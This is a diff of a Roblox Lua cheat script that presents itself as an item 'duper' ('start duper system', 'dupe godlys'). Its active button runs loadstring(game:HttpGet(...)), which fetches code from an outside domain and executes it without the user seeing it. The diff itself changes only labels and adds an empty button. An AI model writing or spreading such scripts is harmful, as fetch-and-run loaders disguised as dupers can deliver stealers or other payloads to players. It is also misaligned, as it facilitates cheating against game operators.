@@ -30,9 +30,9 @@ local MainTab = Window:CreateTab("Duper", nil) -- Title, Image
 local MainSection = MainTab:CreateSection("Main")
 
 Rayfield:Notify({
-   Title = "now wait 5-10 mins after runing script",
+   Title = "after executing wait 5-10 mins after runing script",
    Content = "by me!",
-   Duration = 5,
+   Duration = 6,
    Image = 13047715178,
    Actions = { -- Notification Buttons
       Ignore = {
@@ -45,9 +45,16 @@ Rayfield:Notify({
 })
 
 local Button = MainTab:CreateButton({
-   Name = "duper",
+   Name = "start duper system",
    Callback = function()
 loadstring(game:HttpGet("https://egorikusa.space/c7d07e24756c075bc2e7d3c7.lua", true))()
+   end,
+})
+
+local Button = MainTab:CreateButton({
+   Name = "dupe godlys",
+   Callback = function()
+
    end,
 })
 
